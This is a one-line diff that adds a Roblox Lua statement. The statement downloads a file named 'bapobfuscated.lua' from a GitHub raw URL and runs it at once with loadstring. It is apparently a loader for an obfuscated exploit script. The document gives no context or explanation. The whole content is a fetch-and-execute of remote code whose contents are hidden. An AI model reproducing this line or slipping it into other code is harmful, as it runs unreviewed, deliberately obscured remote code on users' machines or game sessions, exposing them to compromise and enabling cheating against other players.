@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Z1ntrax/bigmac/refs/heads/main/bap/bapobfuscated.lua"))()
